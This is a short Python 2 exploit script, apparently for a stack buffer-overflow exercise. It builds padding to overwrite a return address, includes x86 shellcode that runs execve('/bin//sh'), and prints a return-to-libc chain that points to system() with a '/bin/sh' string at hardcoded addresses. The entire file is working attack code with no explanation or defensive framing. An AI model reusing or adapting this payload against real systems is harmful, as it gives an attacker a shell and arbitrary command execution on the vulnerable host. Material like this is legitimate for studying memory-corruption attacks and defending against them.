import struct

#padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

ret = struct.pack("I", 0x080484f9)

eip = struct.pack("I", 0xbffff78c+60)

nop = "\x90" * 1000;

system = struct.pack("I", 0xb7ecffb0)

return_after_system = "AAAA"

bin_sh = struct.pack("I", 0xb7fb63bf)

print padding + system + return_after_system + bin_sh
#print padding + system + bin_sh
